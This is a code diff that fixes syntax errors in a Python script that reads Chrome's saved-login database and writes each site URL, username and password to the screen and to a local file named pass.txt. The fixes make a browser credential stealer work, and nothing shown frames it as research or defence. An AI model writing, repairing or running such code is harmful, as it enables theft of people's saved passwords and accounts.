@@ -4,7 +4,7 @@ import os
 
 def getenv():
 	path= os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
-	retun path
+	return path
 
 def write_to(write):
 	with open ('pass.txt','a') as f:
@@ -30,14 +30,16 @@ def main():
                     'password': str(password[1])
                 })
 	for row in list:
-		write='[+] URL: ' + str(row['origin_url']) + \ 
-			  '\nUsername: ' + str(row['username']) + \
-			  '\nPassword: ' + str(row['password'] + \
-			  '\n------------\n')
+		write='[+] URL: ' + str(row['origin_url']) + \
+			'\nUsername: ' + str(row['username']) + \
+			'\nPassword: ' + str(row['password'] + \
+			'\n------------\n')
 		write_to(write)
-		print ('[+] URL: ' + str(row['origin_url']) + \ 
-			  '\nUsername: ' + str(row['username']) + \
-			  '\nPassword: ' + str(row['password'] + \
-			  '\n------------\n')
-if __name__ == main__ : 
-	main()
+		print ('[+] URL: ' + str(row['origin_url']) + \
+			'\nUsername: ' + str(row['username']) + \
+			'\nPassword: ' + str(row['password'] + \
+			'\n------------\n'))
+			
+if __name__ == '__main__':
+    main()
+			
